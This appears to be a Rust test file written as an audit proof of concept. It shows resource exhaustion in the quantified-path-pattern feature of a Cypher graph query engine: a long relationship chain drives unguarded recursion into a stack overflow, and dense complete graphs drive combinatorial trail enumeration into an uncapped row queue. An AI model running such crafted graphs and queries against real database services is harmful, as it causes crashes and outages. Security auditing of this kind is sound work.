//! TEMPORARY security PoC (audit): QPP resource-exhaustion. Delete after the audit.
use graphus_core::Value;
use graphus_cypher::binding::{Parameters, bind_parameters};
use graphus_cypher::catalog::IndexCatalog;
use graphus_cypher::executor::execute;
use graphus_cypher::graph_access::{MemGraph, NodeId};
use graphus_cypher::lexer::tokenize;
use graphus_cypher::lower::lower;
use graphus_cypher::parser::parse_tokens;
use graphus_cypher::physical::plan_physical;
use graphus_cypher::runtime::Row;
use graphus_cypher::semantics::analyze;

fn i(n: i64) -> Value {
    Value::Integer(n)
}

fn run(src: &str, graph: &mut MemGraph) -> Vec<Row> {
    let toks = tokenize(src).expect("lex");
    let ast = parse_tokens(&toks, src).expect("parse");
    let validated = analyze(&ast).expect("analyze");
    let plan = plan_physical(&lower(&validated), &IndexCatalog::empty());
    let bound = bind_parameters(&plan, &Parameters::new()).expect("bind");
    execute(&plan, &bound, graph)
        .expect("open")
        .collect_all()
        .expect("rows")
}

/// PoC A: unbounded DFS recursion depth. A directed chain of N relationships makes the QPP `+`
/// trail walk recurse ~O(N) deep with NO depth guard -> stack overflow (process abort).
#[test]
fn poc_a_stack_overflow_long_chain() {
    let n: usize = 50_000;
    let mut g = MemGraph::new();
    let nodes: Vec<NodeId> = (0..=n)
        .map(|k| g.add_node(["N"], [("id", i(k as i64))]))
        .collect();
    for k in 0..n {
        g.add_rel("R", nodes[k], nodes[k + 1], [("w", i(0))]);
    }
    eprintln!("PoC A: chain of {n} edges built; running unbounded '+' QPP...");
    let rows = run(
        "MATCH (a {id:0})((x)-[:R]->(y))+(b) RETURN count(b) AS c",
        &mut g,
    );
    // If we get here without a crash, print the count (means no overflow at this N).
    eprintln!("PoC A: survived, rows={}", rows.len());
}

/// PoC B: unbounded `pending` / combinatorial rows. A dense (near-complete) digraph makes the QPP
/// `+` trail walk enumerate a super-polynomial number of simple (trail) paths, each materialized as
/// a full Row into an uncapped `pending` VecDeque -> CPU/memory blowup with NO row/memory budget.
#[test]
fn poc_b_combinatorial_dense_graph() {
    for m in [8usize, 9, 10, 11] {
        let mut g = MemGraph::new();
        let nodes: Vec<NodeId> = (0..m)
            .map(|k| g.add_node(["T"], [("id", i(k as i64))]))
            .collect();
        // Complete directed graph (every ordered pair, no self-loop): m*(m-1) edges.
        for a in 0..m {
            for b in 0..m {
                if a != b {
                    g.add_rel("E", nodes[a], nodes[b], [("w", i(0))]);
                }
            }
        }
        let t0 = std::time::Instant::now();
        let rows = run(
            "MATCH (a {id:0})((x)-[:E]->(y))+(b) RETURN count(*) AS c",
            &mut g,
        );
        // count(*) collapses to 1 row, but the walk emitted one pending Row per trail path first.
        let c = match rows[0].value("c") {
            Value::Integer(n) => n,
            other => panic!("{other:?}"),
        };
        eprintln!(
            "PoC B: K_{m} ({} edges) -> {c} trail-path rows enumerated in {:?}",
            m * (m - 1),
            t0.elapsed()
        );
    }
}
